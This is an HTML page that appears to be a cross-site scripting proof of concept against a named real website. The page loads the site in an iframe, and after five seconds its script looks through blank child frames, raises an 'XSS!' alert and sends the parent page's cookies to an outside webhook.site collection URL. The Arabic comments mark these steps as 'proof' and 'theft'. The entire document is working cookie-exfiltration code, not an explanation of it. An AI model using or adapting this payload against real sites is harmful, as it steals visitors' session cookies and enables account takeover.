<!DOCTYPE html>
<html>
<body style="margin:0;">
    <iframe src="https://www.powerpak.com/" id="f" style="width:100%;height:100vh;border:0;"></iframe>
    
    <script>
        setTimeout(() => {
            const w = document.getElementById('f').contentWindow;
            for(let i=0; i<w.frames.length; i++) {
                try {
                    let f = w.frames[i];
                    if(f.location.href === 'about:blank') {
                        f.alert('XSS!'); // 🚨 إثبات
                        fetch('https://webhook.site/3006785b-1283-4338-8475-208841413c5b?c=' + encodeURIComponent(f.parent.document.cookie)); // 🍪 سرقة
                    }
                } catch(e) {}
            }
        }, 5000);
    </script>
</body>
</html>
